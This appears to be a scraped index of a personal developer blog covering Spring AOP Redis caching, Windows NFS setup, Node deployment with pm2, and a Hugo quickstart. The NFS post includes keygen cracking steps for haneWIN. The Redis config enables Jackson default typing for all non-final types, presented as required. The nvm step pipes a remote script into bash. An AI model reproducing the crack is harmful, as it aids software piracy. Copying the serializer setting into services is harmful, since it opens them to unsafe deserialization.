com.fasterxml.jackson.annotation.JsonTypeInfo; import com.fasterxml.jackson.annotation.PropertyAccessor; import com.fasterxml.jackson.databind.ObjectMapper; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.data.redis.connection.RedisConnectionFactory; import org.springframework.data.redis.core.RedisTemplate; import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer; import org.springframework.data.redis.serializer.RedisSerializer; import org.springframework.data.redis.serializer.StringRedisSerializer; /** * @Description * @Author bin * @Date 2022/07/19 */ @Configuration public class RedisConfig { @Bean public RedisTemplate\u0026lt;String, Object\u0026gt; template(RedisConnectionFactory factory) { // 创建RedisTemplate\u0026lt;String, Object\u0026gt;对象 RedisTemplate\u0026lt;String, Object\u0026gt; template = new RedisTemplate\u0026lt;\u0026gt;(); // 配置连接工厂 template.setConnectionFactory(factory); // redis key 序列化方式使用stringSerial template.setKeySerializer(new StringRedisSerializer()); // redis value 序列化方式自定义 // template.setValueSerializer(new GenericFastJsonRedisSerializer()); template.setValueSerializer(valueSerializer()); // redis hash key 序列化方式使用stringSerial template.setHashKeySerializer(new StringRedisSerializer()); // redis hash value 序列化方式自定义 // template.setHashValueSerializer(new GenericFastJsonRedisSerializer()); template.setHashValueSerializer(valueSerializer()); return template; } private RedisSerializer\u0026lt;Object\u0026gt; valueSerializer() { Jackson2JsonRedisSerializer\u0026lt;Object\u0026gt; jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer\u0026lt;\u0026gt;(Object.class); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY); // 此项必须配置，否则如果序列化的对象里边还有对象，会报如下错误： // java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to XXX objectMapper.activateDefaultTyping( objectMapper.getPolymorphicTypeValidator(), ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); // 旧版写法： // objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); jackson2JsonRedisSerializer.setObjectMapper(objectMapper); return jackson2JsonRedisSerializer; } } redis缓存注解：插入 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import njgis.opengms.portal.enums.ItemTypeEnum; import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; /** * @Description 新增redis缓存 * @Author bin * @Date 2022/07/19 */ @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.METHOD) public @interface AopCacheEnable { //redis缓存key String key(); //redis缓存存活时间默认值（可自定义） long expireTime() default 3600; //redis缓存的分组 ItemTypeEnum group() default ItemTypeEnum.PortalItem; } redis缓存注解：删除 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import java.lang.annotation.ElementType; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; /** * @Description * @Author bin * @Date 2022/07/19 */ @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.METHOD) public @interface AopCacheEvict { //redis中的key值 String key(); //redis缓存的分组 String group(); } 自定义缓存切面具体实现类 CacheEnableAspect.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 import lombok.extern.slf4j.Slf4j; import njgis.opengms.portal.enums.ItemTypeEnum; import njgis.opengms.portal.service.RedisService; import org.aspectj.lang.ProceedingJoinPoint; import org.aspectj.lang.Signature; import org.aspectj.lang.annotation.Around; import org.aspectj.lang.annotation.Aspect; import org.aspectj.lang.annotation.Pointcut; import org.aspectj.lang.reflect.MethodSignature; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.core.DefaultParameterNameDiscoverer; import org.springframework.expression.EvaluationContext; import org.springframework.expression.Expression; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.expression.spel.support.StandardEvaluationContext; import org.springframework.stereotype.Component; import java.lang.reflect.Method; /** * @Description 自定义缓存切面具体实现类 * @Author bin * @Date 2022/07/19 */ @Slf4j @Aspect @Component public class CacheEnableAspect { @Autowired RedisService redisService; /** * 用于SpEL表达式解析. */ private SpelExpressionParser parser = new SpelExpressionParser(); /** * 用于获取方法参数定义名字. */ private DefaultParameterNameDiscoverer nameDiscoverer = new DefaultParameterNameDiscoverer(); /** * Mapper层切点 使用到了我们定义的 AopCacheEnable 作为切点表达式。 */ @Pointcut(\u0026#34;@annotation(njgis.opengms.portal.component.AopCacheEnable)\u0026#34;) public void queryCache() { } /** * Mapper层切点 使用到了我们定义的 AopCacheEvict 作为切点表达式。 */ @Pointcut(\u0026#34;@annotation(njgis.opengms.portal.component.AopCacheEvict)\u0026#34;) public void ClearCache() { } @Around(\u0026#34;queryCache()\u0026#34;) public Object Interceptor(ProceedingJoinPoint pjp) throws Throwable { // StringBuilder redisKeySb = new StringBuilder(\u0026#34;AOP\u0026#34;).append(\u0026#34;::\u0026#34;); StringBuilder redisKeySb = new StringBuilder(\u0026#34;AOP\u0026#34;); // 类 // String className = pjp.getTarget().toString().split(\u0026#34;@\u0026#34;)[0]; // redisKeySb.append(className).append(\u0026#34;::\u0026#34;); //获取当前被切注解的方法名 Method method = getMethod(pjp); //获取当前被切方法的注解 AopCacheEnable aopCacheEnable = method.getAnnotation(AopCacheEnable.class); if (aopCacheEnable == null) { return pjp.proceed(); } //获取被切注解方法返回类型 // Type returnType = method.getAnnotatedReturnType().getType(); // String[] split = returnType.getTypeName().split(\u0026#34;\\\\.\u0026#34;); // String type = split[split.length - 1]; // redisKeySb.append(\u0026#34;:\u0026#34;).append(type); //从注解中获取key //通过注解key使用的SpEL表达式获取到SpEL执行结果 String key = aopCacheEnable.key(); // redisKeySb.append(args); String resV = generateKeyBySpEL(key, pjp).toString(); redisKeySb.append(\u0026#34;:\u0026#34;).append(aopCacheEnable.group()).append(\u0026#34;:\u0026#34;).append(resV); //获取方法参数值 // Object[] arguments = pjp.getArgs(); // redisKeySb.append(\u0026#34;:\u0026#34;).append(arguments[0]); String redisKey = redisKeySb.toString(); Object result = redisService.get(redisKey); if (result != null) { log.info(\u0026#34;从Redis中获取数据：{}\u0026#34;, result); return result; } else { try { result = pjp.proceed(); log.info(\u0026#34;从数据库中获取数据：{}\u0026#34;, result); } catch (Throwable e) { throw new RuntimeException(e.getMessage(), e); } // 获取失效时间 long expire = aopCacheEnable.expireTime(); redisService.set(redisKey, result, expire); } return result; } /*** 定义清除缓存逻辑，先操作数据库，后清除缓存*/ @Around(value = \u0026#34;ClearCache()\u0026#34;) public Object evict(ProceedingJoinPoint pjp) throws Throwable { StringBuilder redisKeySb = new StringBuilder(\u0026#34;AOP\u0026#34;); Method method = getMethod(pjp); // 获取方法的注解 AopCacheEvict cacheEvict = method.getAnnotation(AopCacheEvict.class); if (cacheEvict == null) { return pjp.proceed(); } //从注解中获取key //通过注解key使用的SpEL表达式获取到SpEL执行结果 String key = cacheEvict.key(); // redisKeySb.append(args); key = generateKeyBySpEL(key, pjp).toString(); //清楚缓存的group从参数拿 String group = cacheEvict.group(); ItemTypeEnum type = (ItemTypeEnum)generateKeyBySpEL(group, pjp); redisKeySb.append(\u0026#34;:\u0026#34;).append(type).append(\u0026#34;:\u0026#34;).append(key); //先操作db Object result = pjp.proceed(); //根据key从缓存中删除 String redisKey = redisKeySb.toString(); redisService.delete(redisKey); return result; } /** * 获取被拦截方法对象 */ public Method getMethod(ProceedingJoinPoint pjp) { Signature signature = pjp.getSignature(); MethodSignature methodSignature = (MethodSignature) signature; Method targetMethod = methodSignature.getMethod(); return targetMethod; } public Object generateKeyBySpEL(String spELString, ProceedingJoinPoint joinPoint) { MethodSignature methodSignature = (MethodSignature) joinPoint.getSignature(); String[] paramNames = nameDiscoverer.getParameterNames(methodSignature.getMethod()); Expression expression = parser.parseExpression(spELString); EvaluationContext context = new StandardEvaluationContext(); Object[] args = joinPoint.getArgs(); for (int i = 0; i \u0026lt; args.length; i++) { context.setVariable(paramNames[i], args[i]); } return expression.getValue(context); } } 注意这里的queryCache和ClearCache，里面切点表达式\n分别对应上面自定义的两个AopCacheEnable和AopCacheEvict。\n然后在环绕通知的queryCache方法执行前后时\n获取被切方法的参数，参数中的key，然后根据key去redis中去查询\nService层 redis服务接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public interface RedisService { void set(String key, Object value); void set(String key, Object value, long expire); Object get(String key); void expire(String key, long expire); void delete(String key); // 由于dao接口同时继承了MongoRepository和GenericItemDao， // 所以这边写接口调用他们防止继承冲突 PortalItem insertItem(PortalItem item, ItemTypeEnum type); PortalItem saveItem(PortalItem item, ItemTypeEnum type); void deleteItem(PortalItem item, ItemTypeEnum type); } AopCacheEnable测试\n1 2 3 4 public interface ModelItemDao extends MongoRepository\u0026lt;ModelItem,String\u0026gt;, GenericItemDao\u0026lt;ModelItem\u0026gt; { @AopCacheEnable(key = \u0026#34;#id\u0026#34;, group = ItemTypeEnum.ModelItem) ModelItem findFirstById(String id); } AopCacheEvict测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 @Service(\u0026#34;redisService\u0026#34;) public class RedisServiceImpl implements RedisService { @Autowired private RedisTemplate\u0026lt;String, Object\u0026gt; redisTemplate; @Autowired GenericService genericService; @Override public void set(String key, Object value) { redisTemplate.opsForValue().set(key, value); } @Override public void set(String key, Object value, long expire) { redisTemplate.opsForValue().set(key, value, expire, TimeUnit.SECONDS); } @Override public Object get(String key) { return redisTemplate.opsForValue().get(key); } @Override public void expire(String key, long expire) { redisTemplate.expire(key, expire, TimeUnit.SECONDS); } @Override public void delete(String key) { redisTemplate.delete(key); } @Override public PortalItem insertItem(PortalItem item, ItemTypeEnum type) { GenericItemDao itemDao = (GenericItemDao)genericService.daoFactory(type).get(\u0026#34;itemDao\u0026#34;); PortalItem result = (PortalItem)itemDao.insert(item); return result; } @Override @AopCacheEvict(key = \u0026#34;#item.id\u0026#34;, group = \u0026#34;#type\u0026#34;) public PortalItem saveItem(PortalItem item, ItemTypeEnum type) { GenericItemDao itemDao = (GenericItemDao)genericService.daoFactory(type).get(\u0026#34;itemDao\u0026#34;); PortalItem result = (PortalItem)itemDao.save(item); return result; } @Override public void deleteItem(PortalItem item, ItemTypeEnum type) { GenericItemDao itemDao = (GenericItemDao)genericService.daoFactory(type).get(\u0026#34;itemDao\u0026#34;); itemDao.delete(item); } } 测试 1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Test public void aopFindTest(){ for (int i = 0; i \u0026lt; 5; i++) { ModelItem modelItem = modelItemDao.findFirstById(\u0026#34;3f6857ba-c2d2-4e27-b220-6e5367803a12\u0026#34;); System.out.println(modelItem); } } @Test public void aopSaveTest(){ ModelItem modelItem = modelItemDao.findFirstById(\u0026#34;3f6857ba-c2d2-4e27-b220-6e5367803a12\u0026#34;); modelItem.setThumbsUpCount(50); redisService.saveItem(modelItem,ItemTypeEnum.ModelItem); } 遇到的问题 问题：\nCould not safely identify store assignment for repository candidate interface 条件： 使用了Spring data jpa 作为持久层框架并同时使用starter引入了Elasticsearch或Redis依赖包。\n原因： RedisRepositoriesAutoConfiguration或ElasticsearchRepositoriesAutoConfiguration 里面的注解@ConditionalOnProperty会判断 spring.data.redis/elasticsearch.repositories.enabled 这个配置项是否存在。若存在会自动扫描继承org.springframework.data.repository.Repository的实体Repository接口。\n解决办法：\n1 2 3 4 5 6 7 8 spring: data: redis: repositories: enabled: false elasticsearch: repositories: enabled: false 问题：\nRedis获取缓存异常 Resolved [java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to com.alibaba.fastjson.JSONObject]\n出现场景：\nSpringBoot项目中使用Redis来进行缓存。把数据放到缓存中时没有问题，但从缓存中取出来反序列化为对象时报错：“java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to xxx”。（xxx为反序列化的目标对象对应的类。）\n只有这个类里有其他对象字段才会报这个问题，如果这个类里都是初始的类型（比如：Integer，String）则不会报这个错误。\n只要用到Redis序列化反序列化的地方都会遇到这个问题，比如：RedisTemplate，Redisson，@Cacheable注解等。\n原因：\nSpringBoot 的缓存使用 jackson 来做数据的序列化与反序列化，如果默认使用 Object 作为序列化与反序列化的类型，则其只能识别 java 基本类型，遇到复杂类型时，jackson 就会先序列化成 LinkedHashMap ，然后再尝试强转为所需类别，这样大部分情况下会强转失败。\n解决方法：\n出现这种异常，需要自定义ObjectMapper，设置一些参数，而不是直接使用Jackson2JsonRedisSerializer类中黙认的ObjectMapper，看源代码可以知道，Jackson2JsonRedisSerializer中的ObjectMapper是直接使用new ObjectMapper()创建的，这样ObjectMapper会将Redis中的字符串反序列化为java.util.LinkedHashMap类型，导致后续Spring对其进行转换成报错。其实我们只要它返回Object类型就可以了。\n修改RedisTemplate这个bean的valueSerializer，设置默认类型。\n参考博客：\nhttps://blog.51cto.com/knifeedge/5010643\n修改配置类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 @Configuration public class RedisConfig { @Bean public RedisTemplate\u0026lt;String, Object\u0026gt; template(RedisConnectionFactory factory) { // 创建RedisTemplate\u0026lt;String, Object\u0026gt;对象 RedisTemplate\u0026lt;String, Object\u0026gt; template = new RedisTemplate\u0026lt;\u0026gt;(); // 配置连接工厂 template.setConnectionFactory(factory); // redis key 序列化方式使用stringSerial template.setKeySerializer(new StringRedisSerializer()); // redis value 序列化方式自定义，使用jackson会出现转换类型的错误 // template.setValueSerializer(new GenericFastJsonRedisSerializer()); template.setValueSerializer(valueSerializer()); // redis hash key 序列化方式使用stringSerial template.setHashKeySerializer(new StringRedisSerializer()); // redis hash value 序列化方式自定义，使用jackson会出现转换类型的错误 // template.setHashValueSerializer(new GenericFastJsonRedisSerializer()); template.setHashValueSerializer(valueSerializer()); return template; } private RedisSerializer\u0026lt;Object\u0026gt; valueSerializer() { Jackson2JsonRedisSerializer\u0026lt;Object\u0026gt; jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer\u0026lt;\u0026gt;(Object.class); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY); // 此项必须配置，否则如果序列化的对象里边还有对象，会报如下错误： // java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to XXX objectMapper.activateDefaultTyping( objectMapper.getPolymorphicTypeValidator(), ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); // 旧版写法： // objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY); jackson2JsonRedisSerializer.setObjectMapper(objectMapper); return jackson2JsonRedisSerializer; } } 问题：\n注解不生效 ==注解生效代码==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 @UserCacheEnable(key = \u0026#34;#email\u0026#34;) public JSONObject getItemUserInfoByEmail(String email) { User user = null; JSONObject userJson = new JSONObject(); if (email.contains(\u0026#34;@\u0026#34;)){ user = userDao.findFirstByEmail(email); } else { user = userDao.findFirstByAccessId(email); if (user != null){ email = user.getEmail(); } else { userJson.put(\u0026#34;name\u0026#34;, email); userJson.put(\u0026#34;email\u0026#34;, null); userJson.put(\u0026#34;accessId\u0026#34;, null); userJson.put(\u0026#34;image\u0026#34;, null); return userJson; } } JSONObject userInfo = getInfoFromUserServer(email); userJson.put(\u0026#34;name\u0026#34;, userInfo.getString(\u0026#34;name\u0026#34;)); // userJson.put(\u0026#34;id\u0026#34;, user.getId()); userJson.put(\u0026#34;email\u0026#34;, user.getEmail()); userJson.put(\u0026#34;accessId\u0026#34;, user.getAccessId()); // userJson.put(\u0026#34;image\u0026#34;, user.getAvatar().equals(\u0026#34;\u0026#34;) ? \u0026#34;\u0026#34; : htmlLoadPath + user.getAvatar()); userJson.put(\u0026#34;image\u0026#34;, userInfo.getString(\u0026#34;avatar\u0026#34;)); return userJson; } ==注解失效代码==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 @UserCacheEnable(key = \u0026#34;#email\u0026#34;) public JSONObject getInfoFromUserServer(String email){ // return getInfoFromUserServerPart(email); JSONObject jsonObject = new JSONObject(); try { RestTemplate restTemplate = new RestTemplate(); String userInfoUrl = \u0026#34;http://\u0026#34; + userServer + \u0026#34;/user/\u0026#34; + email + \u0026#34;/\u0026#34; + userServerCilent + \u0026#34;/\u0026#34; + userServerCilentPWD; HttpHeaders headers = new HttpHeaders(); MediaType mediaType = MediaType.parseMediaType(\u0026#34;application/json;charset=UTF-8\u0026#34;); headers.setContentType(mediaType); headers.set(\u0026#34;user-agent\u0026#34;, \u0026#34;portal_backend\u0026#34;); HttpEntity httpEntity = new HttpEntity(headers); ResponseEntity\u0026lt;JSONObject\u0026gt; response = restTemplate.exchange(userInfoUrl, HttpMethod.GET, httpEntity, JSONObject.class); JSONObject userInfo = response.getBody().getJSONObject(\u0026#34;data\u0026#34;); String avatar = userInfo.getString(\u0026#34;avatar\u0026#34;); if(avatar!=null){ // avatar = \u0026#34;/userServer\u0026#34; + avatar; //修正avatar前面加了/userServer // avatar = avatar.replaceAll(\u0026#34;/userServer\u0026#34;,\u0026#34;\u0026#34;); genericService.formatUserAvatar(avatar); } userInfo.put(\u0026#34;avatar\u0026#34;,avatar); userInfo.put(\u0026#34;msg\u0026#34;,\u0026#34;suc\u0026#34;); return userInfo; }catch(Exception e){ log.error(e.getMessage()); // System.out.println(e.fillInStackTrace()); jsonObject.put(\u0026#34;msg\u0026#34;,\u0026#34;no user\u0026#34;); } return jsonObject; } 原因：\nSpring AOP 注解为什么失效？\n如下面几种场景\n1、Controller直接调用Service B方法：Controller \u0026gt; Service A\n在Service A 上加@Transactional的时候可以正常实现AOP功能。\n2、==Controller调用Service A方法，A再调用B方法：Controller \u0026gt; Service A \u0026gt; Service B==\n在Service B上加@Transactional的时候不能实现AOP功能，因为==在Service A方法中调用Service B方法想当于使用this.B()，this代表的是Service类本身，并不是真实的代理Service对象==，所以这种不能实现代理功能。\n所以，如果不是直接调用的方式，是不能实现代理功能的，非常需要注意。\n","permalink":"https://chance7bin.github.io/posts/design/spring-aop-%E5%AE%9E%E7%8E%B0-redis-%E7%BC%93%E5%AD%98%E5%88%87%E9%9D%A2/","summary":"@EnableCaching spring boot提供了比较简单的缓存方案。只要使用 @EnableCaching 即可完成简单的缓存功能。 https://blog.csdn.net/micro_hz/article/details/76599632 参考博客 Spring的面向切面编程（AOP） Spring AOP 实现 Redis 缓存切面 Sp","title":"Spring AOP 实现 Redis 缓存切面"},{"content":" 需求：\n需要在k8s中使用到NFS，应该是在linux中配置nfs的，但是由于是在windows开发，所以有了在windwos配置nfs的需求\n1.安装haneWIN HaneWin NFS Server 是一个可以帮助快速搭建NFS服务器的软件\nhttps://www.hanewin.net/nfs-e.htm\n2.破解haneWIN haneWIN NFS Server 1.2.10 注册机下载： haneWIN NFS Server Keygen.7z (8265) (解压密码：astray.cn)\n运行注册机，输入Name，点击左边的按钮，生成Serial\n打开NFS Server，在注册界面输入注册机生成的License key和Your name，并点击Register\n点击help - About 查看是否注册成功\n3.配置exports文件 1 2 # exports example E:\\opengms-lab\\container\\nfs -public 上述配置的意思是将E:\\opengms-lab\\container\\nfs目录共享出去\n将该exports文件覆盖到软件的安装位置\n其他配置参考\n4.linux挂载设置 创建目录\n1 [root@localhost ~]# mkdir /opt/windowsNFS 挂载\n1 [root@localhost ~]# mount -t nfs 172.21.212.240:/e/opengms-lab/container/nfs /opt/windowsNFS 若无nfs功能\n1 2 3 [root@localhost cdrom]# yum install -y nfs-utils #安装nfs功能 #需要联网或者配置本地yum源 5.挂载不上的可能原因 1 2 [root@clustermaster opt]# mount -t nfs 172.21.212.240:/e/opengms-lab/container/nfs /opt/windowsNFS mount.nfs: Connection timed out 防火墙惹得祸：需要禁用防火墙\n设置windows防火墙的入栈规则（TCP，UDP） （另外对配置文件规则，就看你的网络连接是公用、专用、域的哪种了） \u0026lt;经验证，使用hanWinNFS或windows自带的NFS服务 都是仅开放111,1058,2049 就可以了\u0026gt;\n到这里基本就ok了，但正式给某学校应用时发现还是不得，后来发现学校做了阻止策略中把端口全部禁止了，要把禁止策略中的 111,1058,2049给去掉就可以了。\n6.检查挂载是否有问题 mount -a 可跳过， 直接用 df -h 查看\n1 [root@localhost ~]# mount -a 重启检查目录是否挂载\n1 2 3 4 5 6 7 8 9 10 [root@localhost ~]# df -h 文件系统 容量 已用 可用 已用% 挂载点 /dev/mapper/centos-root 47G 7.5G 40G 16% / devtmpfs 895M 0 895M 0% /dev tmpfs 911M 0 911M 0% /dev/shm tmpfs 911M 28M 884M 4% /run tmpfs 911M 0 911M 0% /sys/fs/cgroup /dev/sda1 1014M 170M 845M 17% /boot tmpfs 183M 12K 183M 1% /run/user/42 172.21.212.240:/e/opengms-lab/container/nfs 782G 684G 99G 88% /opt/windowsNFS 7.linux无法写入文件 具体做法：\n1.在haneWIN NFS Server的exports文件中增加 -maproot:0\n2.重新挂载\n1 [root@clustermaster /]# umount 172.21.212.240:/e/opengms-lab/container/nfs 取消挂载后原本挂载的文件夹可能会出现错误\n1 2 3 4 5 6 7 8 [root@clustermaster opt]# ll ls: 无法访问windowsNFS: 失效文件句柄 总用量 4 drwxr-xr-x 3 root root 17 2月 8 10:48 cni drwx--x--x 4 root root 28 2月 7 20:14 containerd drwxr-xr-x 5 root root 4096 4月 27 20:59 k8s drwxr-xr-x. 2 root root 6 9月 7 2017 rh d?????????? ? ? ? ? ? windowsNFS 需执行以下操作修复文件夹\n1 2 3 4 5 6 7 8 [root@clustermaster opt]# umount -l /opt/windowsNFS [root@clustermaster opt]# ll 总用量 4 drwxr-xr-x 3 root root 17 2月 8 10:48 cni drwx--x--x 4 root root 28 2月 7 20:14 containerd drwxr-xr-x 5 root root 4096 4月 27 20:59 k8s drwxr-xr-x. 2 root root 6 9月 7 2017 rh drwxr-xr-x 2 root root 6 5月 10 15:36 windowsNFS 再次挂载nfs\n1 [root@clustermaster opt]# mount -t nfs 172.21.212.240:/e/opengms-lab/container/nfs /opt/windowsNFS ","permalink":"https://chance7bin.github.io/posts/note/windows%E9%85%8D%E7%BD%AEnfs/","summary":"需求： 需要在k8s中使用到NFS，应该是在linux中配置nfs的，但是由于是在windows开发，所以有了在windwos配置nfs的需求","title":"Windows配置NFS"},{"content":"linux 解压 tar 文件 要在Linux上解压缩.tar文件，可以使用以下命令：\ntar -xvf file.tar\n这将解压缩.tar文件并将其提取到当前目录中。您可以将“file.tar”替换为您要解压缩的文件的实际名称。\n此外，您可以使用以下选项来指定解压缩的位置和/或将解压缩的文件重定向到另一个文件：\n-C：指定要解压缩的目标目录。例如，要将文件提取到“/home/user/files/”目录中，请使用以下命令：\narduino\n1 tar -xvf file.tar -C /home/user/files/ -f：指定要解压缩的文件名。这个选项必须出现在命令行的最后一个。\n-O：将解压缩的文件重定向到标准输出。例如，要将文件提取并打印到屏幕上，请使用以下命令：\nmathematica\n1 tar -xvf file.tar -O 请注意，在解压缩.tar.gz文件时，您可以使用“z”选项来启用gzip压缩：\ntar -xzvf file.tar.gz\n同样，您可以使用“j”选项来启用bzip2压缩：\ntar -xjvf file.tar.bz2\nubuntu 安装nvm 要在Ubuntu上安装nvm（Node Version Manager），可以按照以下步骤操作：\n首先，使用curl命令下载nvm安装脚本。您可以使用以下命令：\nbash\n1 curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash 上述命令会下载nvm安装脚本并在bash shell中运行。\n安装脚本运行后，需要注销当前的终端并重新登录才能使nvm生效。您也可以运行以下命令来使nvm生效：\nbash\n1 source ~/.bashrc 这将重新加载bash shell并使nvm可用。\n安装完成后，您可以使用以下命令来安装Node.js：\nnvm install node\n这将安装最新版本的Node.js。您还可以安装指定版本的Node.js，例如：\nnvm install 14.17.6\n这将安装Node.js的14.17.6版本。\n使用以下命令来验证Node.js是否已正确安装：\nnode -v\n这将显示已安装的Node.js版本号。\n注意：上述步骤假设您正在使用bash shell。如果您使用的是其他shell，请相应地更改命令。\nubuntu安装pm2 要在Ubuntu上安装pm2，可以按照以下步骤操作：\n首先，请确保您已经安装了Node.js和npm。您可以使用以下命令来检查它们是否已安装：\nnode -v npm -v\n如果它们没有安装，请按照适当的方式安装它们。\n安装pm2，可以使用npm包管理器来完成。在终端中运行以下命令：\nnpm install pm2 -g\n这将使用npm全局安装pm2。\n安装完成后，您可以使用以下命令来验证是否已正确安装pm2：\ncss\n1 pm2 --version 这将显示已安装的pm2版本号。\n现在，您可以使用pm2启动Node.js应用程序。例如，要使用pm2启动名为myapp.js的应用程序，请使用以下命令：\nsql\n1 pm2 start myapp.js 这将启动应用程序并使用pm2管理它。您可以使用以下命令来查看所有正在运行的应用程序：\npm2 list\n您可以使用其他命令，如pm2 restart、pm2 stop和pm2 delete来管理应用程序。\n注意：上述步骤假设您已经正确设置了Node.js应用程序并已准备好使用pm2来管理它们。如果您需要设置应用程序，请按照适当的方式完成。\nubuntu中使用pm2启动node项目 要在Ubuntu中使用pm2启动Node.js项目，您可以按照以下步骤操作：\n首先，请确保您已经安装了Node.js和npm。您可以使用以下命令来检查它们是否已安装：\nnode -v npm -v\n如果它们没有安装，请按照适当的方式安装它们。\n在您的Node.js项目目录中，使用以下命令安装所有依赖项：\nnpm install\n这将安装项目所需的所有npm包。\n安装pm2，可以使用npm包管理器来完成。在终端中运行以下命令：\nnpm install pm2 -g\n这将使用npm全局安装pm2。\n现在，您可以使用pm2启动Node.js应用程序。例如，要使用pm2启动名为bin/www的应用程序，请使用以下命令：\n1 pm2 start bin/www 这将启动应用程序并使用pm2管理它。您可以使用以下命令来查看所有正在运行的应用程序：\npm2 list\n您可以使用其他命令，如pm2 restart、pm2 stop和pm2 delete来管理应用程序。\n如果您需要配置pm2以在系统启动时自动启动应用程序，请使用以下命令：\npm2 startup systemd\n这将创建一个systemd服务，以在系统启动时启动pm2并启动您的应用程序。执行此命令后，pm2将为您提供一条命令，您需要复制并在终端中运行它以完成服务的创建。\n注意：上述步骤假设您已经正确设置了Node.js应用程序并已准备好使用pm2来管理它们。如果您需要设置应用程序，请按照适当的方式完成。\n","permalink":"https://chance7bin.github.io/posts/note/ubuntu%E9%83%A8%E7%BD%B2node%E9%A1%B9%E7%9B%AE/","summary":"linux 解压 tar 文件 要在Linux上解压缩.tar文件，可以使用以下命令： tar -xvf file.tar 这将解压缩.tar文件并将其提取到当前目录中。您可以将“file.t","title":"ubuntu部署node项目"},{"content":"初见Hugo Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。\n1. 安装 Hugo 到 Hugo Releases 下载适合你的操作系统的版本。\nWindows用户选择windows-amd64.zip\n下载下来的是一个exe文件，需打开cmd进行操作\n1 2 E:\\Projects\\hugo_0.111.2_windows-amd64\u0026gt;hugo version hugo v0.111.2-4164f8fef9d71f50ef3962897e319ab6219a1dad windows/amd64 BuildDate=2023-03-05T12:32:20Z VendorInfo=gohugoio 2. 创建一个新的网站 1 2 // 在命令行输入如下命令会在当前路径下创建一个新的网站文件夹 hugo new site quickstart 3. 添加一个主题 添加主题也可以放在后面\n主题\nhttps://github.com/nanxiaobei/hugo-paper\nhttps://github.com/adityatelange/hugo-PaperMod\nHUGO官方搭建的theme主题站有大量的开源主题可供选择\n基本上所有的主题都自带安装的方法\n这里我选择了一个主题进行演示\nhttps://themes.gohugo.io/themes/hugo-theme-charlolamode/\n在网页下方的说明内，根据步骤安装主题即可\n总结\n1 2 3 cd quickstart git init git submodule add https://github.com/budparr/gohugo-theme-ananke.git themes/ananke 在根目录下的 config.toml 文件中添加一行\n1 echo \u0026#39;theme = \u0026#34;ananke\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.toml 4. 添加一个新的文章 1 2 hugo new posts/my-first-post.md hugo new test.md 创建的新文章都会放在 content 文件夹下\n5. 启动 Hugo 服务器 使用命令启动服务器\n1 hugo server 在浏览器输入localhost:1313即可查看生成的网站\n注意刚才添加的md并没有显示出来，是因为生成的md是drift，hugo默认忽略drift的文档，需在启动时添加-D参数\n1 hugo server -D --theme 选择哪个皮肤; --buildDrafts 由于想显示我们的内容，包括设置了 draft 草稿状态的内容。 部署 Hugo 作为一个 Github Pages Github Pages 本质上是一个静态网站托管系统，你可以使用它为你的每一个仓库制作一个静态网页入口\n1. 创建一个 Github 仓库 首先再Github上创建一个 Repository，命名为Github名字.github.io，例如我的仓库：GoodmanBin.github.io，这样就可以生成一个用户页面\n2. 在本地构建Hugo静态网站 注意！！！\n在生成静态页面之前要把config.toml文件中的baseURL修改为自己博客的网址\n1 baseURL = \u0026#39;https://GoodmanBin.github.io/\u0026#39; 执行命令\n1 hugo 